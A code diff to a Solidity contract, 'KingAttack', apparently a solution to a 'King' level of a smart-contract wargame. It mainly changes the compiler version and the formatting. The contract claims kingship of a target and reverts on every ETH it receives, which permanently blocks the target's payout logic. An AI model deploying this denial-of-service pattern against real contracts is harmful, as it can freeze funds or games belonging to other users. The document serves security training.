@@ -14,23 +14,22 @@ Tools needed for this level:
 */
 
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+pragma solidity ^0.6.0;
 
 contract KingAttack {
+	// The fallback function of King contract is immediately called.
+	constructor(address _king) public payable {
+		(bool success, ) = (_king).call{value: msg.value}('');
 
-    // The fallback function of King contract is immediately called.
-    constructor(address _king) payable {
-     (bool success, ) = (_king).call{value: msg.value}("");
+		if (!success) {
+			revert();
+		}
+	}
 
-      if (!success) {
-          revert();
-      }
-    }
-
-    // Since the objective is to prevent our Smart Contract from being able to receive
-    // ETH and becoming the king forever, we could just NOT put a fallback function, but
-    // the way I did it was putting a fallback function that will always revert.
-    receive() external payable {
-        revert();
-    }
+	// Since the objective is to prevent our Smart Contract from being able to receive
+	// ETH and becoming the king forever, we could just NOT put a fallback function, but
+	// the way I did it was putting a fallback function that will always revert.
+	receive() external payable {
+		revert();
+	}
 }
